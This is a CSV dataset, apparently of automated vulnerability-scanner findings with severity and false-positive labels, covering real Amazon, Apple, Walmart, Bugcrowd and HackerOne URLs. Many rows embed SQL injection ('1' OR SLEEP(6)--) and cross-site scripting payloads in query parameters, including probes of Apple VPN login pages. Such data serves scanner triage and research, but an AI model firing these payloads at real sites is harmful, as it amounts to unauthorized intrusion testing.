url_length,vulnerability,severity,cluster_density,is_false_positive
32,"{""info"": {""severity"": ""CRITICAL""}, ""matched-at"": ""https://iphone.amazon.com/Queen-Size-Piece-Sheet-Set/dp/B01M16WBW1?_encoding=UTF8&amp%3Bpd_rd_w=PA2ZW&amp%3Bcontent-id=amzn1.sym.f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_p=f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_r=F5GCXMG3TT2WQ767F4Y2&amp%3Bpd_rd_wg=1%27+OR+SLEEP%286%29--&amp%3Bpd_rd_r=123cf83f-84dd-4f66-ae26-98f52d8e044e&amp%3Bref_=pd_hp_d_btf_crs_zg_bs_1055398&cb=32596c"", ""name"": ""Chronos Time-Blind SQLi"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,0
32,"{""info"": {""severity"": ""CRITICAL""}, ""matched-at"": ""http://promotions.amazon.com/Carhartt-Workwear-Short-Sleeve-T-Shirt-X-Large/dp/B002GHC19I?_encoding=UTF8&amp%3Bpd_rd_w=5XY7l&amp%3Bcontent-id=amzn1.sym.f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_p=f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_r=BKAEDN22955449CFW1C1&amp%3Bpd_rd_wg=oa5jX&amp%3Bpd_rd_r=1%27+OR+SLEEP%286%29--&amp%3Bref_=pd_hp_d_btf_crs_zg_bs_7141123011&cb=fdf3b4"", ""name"": ""Chronos Time-Blind SQLi"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,0
32,"{""info"": {""severity"": ""CRITICAL""}, ""matched-at"": ""http://promotions.amazon.com/Carhartt-Workwear-Short-Sleeve-T-Shirt-X-Large/dp/B002GHC19I?_encoding=UTF8&amp%3Bpd_rd_w=5XY7l&amp%3Bcontent-id=amzn1.sym.f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_p=f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_r=BKAEDN22955449CFW1C1&amp%3Bpd_rd_wg=oa5jX&amp%3Bpd_rd_r=9828244b-4b9c-42cc-9eec-1ded28eaa442&amp%3Bref_=1%27+OR+SLEEP%286%29--&cb=5953d4"", ""name"": ""Chronos Time-Blind SQLi"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,0
32,"{""info"": {""severity"": ""CRITICAL""}, ""matched-at"": ""https://ww.amazon.com/FIJI-Natural-Artesian-Water-Bottles/dp/B004CQWWKY?_encoding=UTF8&amp%3Bpd_rd_w=HpMqT&amp%3Bcontent-id=1%27+OR+SLEEP%286%29--&amp%3Bpf_rd_p=f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_r=PFTEXG8A0NSKR4ES3J8S&amp%3Bpd_rd_wg=uO9in&amp%3Bpd_rd_r=5f1ee8ca-fe30-4ca4-b7b8-d8b83d7101e9&amp%3Bref_=pd_hp_d_btf_crs_zg_bs_16310101&cb=e4258d"", ""name"": ""Chronos Time-Blind SQLi"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,0
32,"{""info"": {""severity"": ""CRITICAL""}, ""matched-at"": ""https://ww.amazon.com/FIJI-Natural-Artesian-Water-Bottles/dp/B004CQWWKY?_encoding=UTF8&amp%3Bpd_rd_w=HpMqT&amp%3Bcontent-id=amzn1.sym.f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_p=1%27+OR+SLEEP%286%29--&amp%3Bpf_rd_r=PFTEXG8A0NSKR4ES3J8S&amp%3Bpd_rd_wg=uO9in&amp%3Bpd_rd_r=5f1ee8ca-fe30-4ca4-b7b8-d8b83d7101e9&amp%3Bref_=pd_hp_d_btf_crs_zg_bs_16310101&cb=6a5990"", ""name"": ""Chronos Time-Blind SQLi"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,0
32,"{""info"": {""severity"": ""CRITICAL""}, ""matched-at"": ""https://dl.amazon.com/CELSIUS-Essential-Energy-Strawberry-Coconut/dp/B0CJW7BRX4/?_encoding=UTF8&amp%3Bpd_rd_w=yCJ2o&amp%3Bcontent-id=amzn1.sym.f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_p=f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_r=VC96FBXHQPAQ3NZJQBQC&amp%3Bpd_rd_wg=1%27+OR+SLEEP%286%29--&amp%3Bpd_rd_r=009427e9-de72-4c0f-adc7-8f255a73c63a&amp%3Bref_=pd_hp_d_btf_crs_zg_bs_16310101&cb=4f59d3"", ""name"": ""Chronos Time-Blind SQLi"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,0
32,"{""info"": {""severity"": ""CRITICAL""}, ""matched-at"": ""https://dl.amazon.com/CELSIUS-Essential-Energy-Strawberry-Coconut/dp/B0CJW7BRX4/?_encoding=UTF8&amp%3Bpd_rd_w=yCJ2o&amp%3Bcontent-id=amzn1.sym.f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_p=f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_r=VC96FBXHQPAQ3NZJQBQC&amp%3Bpd_rd_wg=fNKJX&amp%3Bpd_rd_r=009427e9-de72-4c0f-adc7-8f255a73c63a&amp%3Bref_=1%27+OR+SLEEP%286%29--&cb=fdd2ce"", ""name"": ""Chronos Time-Blind SQLi"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,0
32,"{""info"": {""severity"": ""CRITICAL""}, ""matched-at"": ""https://shopbylook.amazon.com/BEDLORE-Waterproof-Protector-Breathable-Dirt-Proof/dp/B0C1NNYJGB?_encoding=UTF8&amp%3Bpd_rd_w=Un7zs&amp%3Bcontent-id=amzn1.sym.f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_p=f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_r=1%27+OR+SLEEP%286%29--&amp%3Bpd_rd_wg=cCZ5w&amp%3Bpd_rd_r=5f8a0856-5ac1-41b3-b9f8-e6c774769d14&amp%3Bref_=pd_hp_d_btf_crs_zg_bs_1055398&cb=d9591b"", ""name"": ""Chronos Time-Blind SQLi"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,0
32,"{""info"": {""severity"": ""CRITICAL""}, ""matched-at"": ""https://www.amazon.com/Amazon-Fresh-Large-Previously-Packaging/dp/B0BXRKRF93?pd_rd_w=x1jQ7&content-id=amzn1.sym.5635b068-2bf5-43b2-bf5e-47af52049db7&pf_rd_p=1%27+OR+SLEEP%286%29--&pf_rd_r=YD8WK9KHXKAQH3KJQ9CG&pd_rd_wg=CuJIe&pd_rd_r=4cfb5328-e141-44db-9114-6d6fe630b3fa&pd_rd_i=B0BXRKRF93&fpw=alm&almBrandId=QW1hem9uIEZyZXNo&ref_=pd_alm_fs_dsk_sf_fs_merch_Fr90959A_sg_5_1_i&cb=1c075b"", ""name"": ""Chronos Time-Blind SQLi"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://www.apple.com/ac/globalnav/2.0/zh_CN/scripts/ac-globalnav.built.js"", ""name"": ""High Entropy Anomaly (H=6.02)"", ""type"": ""VULN""}",63b4529e-a934-48d1-985e-d9107f8baa31,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://share-applenewsroom-dr.apple.com/ac/localeswitcher/4/en_US/scripts/localeswitcher.built.js"", ""name"": ""High Entropy Anomaly (H=4.92)"", ""type"": ""VULN""}",63b4529e-a934-48d1-985e-d9107f8baa31,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://itunesconnect.apple.com/static/itunesconnect.1770335107268.js"", ""name"": ""High Entropy Anomaly (H=4.71)"", ""type"": ""VULN""}",63b4529e-a934-48d1-985e-d9107f8baa31,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://aus1-vpn-asa.apple.com/+CSCOE+/win.js"", ""name"": ""High Entropy Anomaly (H=4.7)"", ""type"": ""VULN""}",63b4529e-a934-48d1-985e-d9107f8baa31,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://itunesconnect.apple.com/static/vendors.1770335107268.js"", ""name"": ""High Entropy Anomaly (H=4.54)"", ""type"": ""VULN""}",63b4529e-a934-48d1-985e-d9107f8baa31,1,1
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://usqas2-dcvpnclient-vpn1.apple.com/+CSCOE+/win.js"", ""name"": ""High Entropy Anomaly (H=4.7)"", ""type"": ""VULN""}",63b4529e-a934-48d1-985e-d9107f8baa31,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://sgsin3-dcvpnclient-vpn1.asia.apple.com/+CSCOE+/win.js"", ""name"": ""High Entropy Anomaly (H=4.7)"", ""type"": ""VULN""}",63b4529e-a934-48d1-985e-d9107f8baa31,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://usdal2-corpclient-vpn12.apple.com/+CSCOE+/win.js"", ""name"": ""High Entropy Anomaly (H=4.7)"", ""type"": ""VULN""}",63b4529e-a934-48d1-985e-d9107f8baa31,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://usdal2-corpclient-vpn14.apple.com/+CSCOE+/win.js"", ""name"": ""High Entropy Anomaly (H=4.7)"", ""type"": ""VULN""}",63b4529e-a934-48d1-985e-d9107f8baa31,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://www.apple.com/ac/globalfooter/2.0/ko_KR/scripts/ac-globalfooter.built.js"", ""name"": ""High Entropy Anomaly (H=4.52)"", ""type"": ""VULN""}",63b4529e-a934-48d1-985e-d9107f8baa31,1,1
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://usqas2-client-vpn12.apple.com/+CSCOE+/win.js"", ""name"": ""High Entropy Anomaly (H=4.7)"", ""type"": ""VULN""}",63b4529e-a934-48d1-985e-d9107f8baa31,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://unpkg.apple.com/@maison/itc@1.2.2/umd/static/js/832.bad80de5cf1117c6.js"", ""name"": ""High Entropy Anomaly (H=5.93)"", ""type"": ""VULN""}",63b4529e-a934-48d1-985e-d9107f8baa31,1,0
32,"{""info"": {""severity"": ""CRITICAL""}, ""matched-at"": ""https://jptyo5-3pclient-vpn1.asia.apple.com/+CSCOE+/logon.html?a0=86&a3=1&reason=1%27+OR+SLEEP%286%29--&cb=7caf2a"", ""name"": ""Chronos Time-Blind SQLi"", ""type"": ""VULN""}",63b4529e-a934-48d1-985e-d9107f8baa31,1,0
32,"{""info"": {""severity"": ""CRITICAL""}, ""matched-at"": ""https://apple.com/wss/fonts?families=1%27+OR+SLEEP%286%29--&cb=37f5c5"", ""name"": ""Chronos Time-Blind SQLi"", ""type"": ""VULN""}",63b4529e-a934-48d1-985e-d9107f8baa31,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://apps.apple.com/api/apps/v1/editorial/us/collections/1842456901/contents?platform=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&extend%5Beditorial-items%5D=editorialArtwork&extend%5Beditorial-pages%5D=editorialArtwork&sparseLimit%5Bcard-contents%5D=0&previewPlatform=iphone&l=en-US"", ""name"": ""GET XSS"", ""type"": ""VULN""}",63b4529e-a934-48d1-985e-d9107f8baa31,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://apps.apple.com/api/apps/v1/editorial/us/collections/1842456901/contents?platform=web&extend%5Beditorial-items%5D=editorialArtwork&extend%5Beditorial-pages%5D=editorialArtwork&sparseLimit%5Bcard-contents%5D=0&previewPlatform=iphone&l=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"", ""name"": ""GET XSS"", ""type"": ""VULN""}",63b4529e-a934-48d1-985e-d9107f8baa31,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://levelup.bugcrowd.com/dist/7.6d8179f8520692ffa43b.js"", ""name"": ""High Entropy Anomaly (H=6.0)"", ""type"": ""VULN""}",12c88edd-2a29-4497-98d2-9d1b312af064,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://trust.bugcrowd.com/cdn-cgi/challenge-platform/h/g/scripts/jsd/b0a7532ac8ec/main.js?"", ""name"": ""High Entropy Anomaly (H=6.02)"", ""type"": ""VULN""}",12c88edd-2a29-4497-98d2-9d1b312af064,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://itmoah.bugcrowd.com/dist/3.d6b8462f87f46f5cd187.js"", ""name"": ""High Entropy Anomaly (H=4.62)"", ""type"": ""VULN""}",12c88edd-2a29-4497-98d2-9d1b312af064,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://itmoah.bugcrowd.com/dist/0.eeccad708c565d2f603c.js"", ""name"": ""High Entropy Anomaly (H=4.61)"", ""type"": ""VULN""}",12c88edd-2a29-4497-98d2-9d1b312af064,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://levelup.bugcrowd.com/dist/viewer/bundle.4fa3d136cfc6157e2894.js"", ""name"": ""High Entropy Anomaly (H=4.53)"", ""type"": ""VULN""}",12c88edd-2a29-4497-98d2-9d1b312af064,1,1
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://itmoah.bugcrowd.com/dist/8.66f680ff8b7438585ffb.js"", ""name"": ""High Entropy Anomaly (H=4.64)"", ""type"": ""VULN""}",12c88edd-2a29-4497-98d2-9d1b312af064,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://trust.bugcrowd.com/cdn-cgi/challenge-platform/scripts/jsd/main.js"", ""name"": ""High Entropy Anomaly (H=6.02)"", ""type"": ""VULN""}",12c88edd-2a29-4497-98d2-9d1b312af064,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://support.hackerone.com/assets/cdn/portal/vendor.js"", ""name"": ""High Entropy Anomaly (H=5.95)"", ""type"": ""VULN""}",ccb8e75a-2a86-4158-98b1-85e1fcf0fb1d,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://static.freshdev.io/fdk/2.0/assets/fresh_parent.js"", ""name"": ""High Entropy Anomaly (H=6.0)"", ""type"": ""VULN""}",f4dd0f7f-618b-4de5-9901-c64f7dfa2c71,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://www.hackerone.com/sites/default/files/styles/max_800x800/public/2025-02/Homepage-Hero-Background.png.webp?itok=%27"", ""name"": ""GET SQLi"", ""type"": ""VULN""}",f4dd0f7f-618b-4de5-9901-c64f7dfa2c71,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://carrier.walmart.com/npm.lodash-84e5e04cd21856a34914-aura.js?d02c828234b2d05e9a25"", ""name"": ""High Entropy Anomaly (H=4.54)"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,1
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://gscope.walmart.com/px/PXrs5WClf5/init.js"", ""name"": ""High Entropy Anomaly (H=4.55)"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,1
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://beta.walmart.com/px/PXu6b0qd2S/captcha/captcha.js?a=c&m=0&u=ea1db410-388f-11f1-89d9-057c62abbcbc&v=ea2d3b1b-388f-11f1-86f6-2b22707ed0e9&g=b"", ""name"": ""High Entropy Anomaly (H=4.56)"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,1
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://gscope.walmart.com/npm.crypto-js-7c77a6d722b59a5855aa-aura.js"", ""name"": ""High Entropy Anomaly (H=6.0)"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://api-beta-game.walmart.com/px/PXBIA59zcf/init.js"", ""name"": ""High Entropy Anomaly (H=5.5)"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://identity.walmart.com/px/PXu6b0qd2S/init.js"", ""name"": ""High Entropy Anomaly (H=4.56)"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,1
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://advertising.walmart.com/px/PXZiTus4E5/captcha/captcha.js?a=c&m=0&g=b"", ""name"": ""High Entropy Anomaly (H=4.52)"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,1
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://www.walmart.com/px/PXu6b0qd2S/captcha/captcha.js?a=c&m=0&g=b"", ""name"": ""High Entropy Anomaly (H=4.52)"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,1
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://leasing.walmart.com/static/js/main.21bcb12e.js"", ""name"": ""High Entropy Anomaly (H=4.54)"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,1
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://api-uat-game.walmart.com/px/PXdtm21B5M/init.js"", ""name"": ""High Entropy Anomaly (H=5.08)"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://beacon.walmart.com/rum.js?mode=release&bh=beacon.walmart.com&bd=&pv_id=3c8cc243-a86d-47ea-b9be-99c8744c315e"", ""name"": ""High Entropy Anomaly (H=4.58)"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,1
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://advertisinghelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_dfs=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_style=-1530529874&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=markup%3A%2F%2Flightning%3AiconSvgTemplatesUtility&aura.lcdn=0&_uid=626_nCkKlQNTsxn2nqHT88z04w"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://advertisinghelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_dfs=8&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_style=-1530529874&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&aura.lcdn=0&_uid=626_nCkKlQNTsxn2nqHT88z04w"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://sellerhelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_dfs=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_style=1507593017&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=markup%3A%2F%2Flightning%3AiconSvgTemplatesUtility&aura.lcdn=0&_uid=626_nCkKlQNTsxn2nqHT88z04w"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://sellerhelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_dfs=8&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_style=1507593017&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&aura.lcdn=0&_uid=626_nCkKlQNTsxn2nqHT88z04w"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://advertisinghelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_plk=rCmQPBndz-4dWLxB5-E2tw&_style=-1530529874&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&_dca=%7B%22_pl%22%3A%7B%22_cn%22%3A%22sitelayout%3A%2F%2Fsiteforce-generatedpage-d6c09e48-3a6c-4c7a-8271-2d64d25914ce.c105%22%2C%22_vc%22%3A%7B%22viewId%22%3A%222bbe3108-5f3b-4d2b-aa98-a10f5e2f6622%22%2C%22routeType%22%3A%22home%22%2C%22themeLayoutType%22%3A%22Inner%22%2C%22params%22%3A%7B%22language%22%3A%22%22%2C%22viewid%22%3A%22d6c09e48-3a6c-4c7a-8271-2d64d25914ce%22%2C%22view_uddid%22%3A%22%22%2C%22entity_name%22%3A%22%22%2C%22audience_name%22%3A%22%22%2C%22picasso_id%22%3A%22%22%2C%22routeId%22%3A%22%22%7D%2C%22hasAttrVaringCmps%22%3Afalse%2C%22pageLoadType%22%3A%22STANDARD_PAGE_CONTENT%22%2C%22includeLayout%22%3Atrue%7D%2C%22_bsi%22%3A%2293295a8a-b647-4f3d-afe3-4e3e62464e1a%22%2C%22_pcn%22%3A105%2C%22_ff%22%3A%22DESKTOP%22%7D%7D"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://sellerhelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_dfs=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_style=1507593017&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader&aura.lcdn=0&_uid=680_Z6a22lDft7RcZZ22-ipKlw"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://sellerhelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_dfs=8&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_style=1507593017&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&aura.lcdn=0&_uid=680_Z6a22lDft7RcZZ22-ipKlw"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://supplierhelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_dfs=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_style=1353199215&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=markup%3A%2F%2Flightning%3AiconSvgTemplatesUtility&aura.lcdn=0&_uid=626_nCkKlQNTsxn2nqHT88z04w"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://supplierhelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_dfs=8&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_style=1353199215&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&aura.lcdn=0&_uid=626_nCkKlQNTsxn2nqHT88z04w"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://sellerhelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_plk=ebRDBPEeyig8LXhlm5WthQ&_style=1507593017&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&_dca=%7B%22_pl%22%3A%7B%22_cn%22%3A%22sitelayout%3A%2F%2Fsiteforce-generatedpage-05a6abcb-53c3-4cd5-826f-7119bc22b489.c253%22%2C%22_vc%22%3A%7B%22viewId%22%3A%22eba9986d-9186-4f34-af88-466d89debedf%22%2C%22routeType%22%3A%22home%22%2C%22themeLayoutType%22%3A%22Inner%22%2C%22params%22%3A%7B%22language%22%3A%22%22%2C%22viewid%22%3A%2205a6abcb-53c3-4cd5-826f-7119bc22b489%22%2C%22view_uddid%22%3A%22%22%2C%22entity_name%22%3A%22%22%2C%22audience_name%22%3A%22%22%2C%22picasso_id%22%3A%22%22%2C%22routeId%22%3A%22%22%7D%2C%22hasAttrVaringCmps%22%3Afalse%2C%22pageLoadType%22%3A%22STANDARD_PAGE_CONTENT%22%2C%22includeLayout%22%3Atrue%7D%2C%22_bsi%22%3A%22731852d7-6daa-470c-a0b3-e29400bdb981%22%2C%22_pcn%22%3A253%2C%22_ff%22%3A%22DESKTOP%22%7D%7D"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://supplierhelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_dfs=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_style=1353199215&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader&aura.lcdn=0&_uid=680_Z6a22lDft7RcZZ22-ipKlw"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
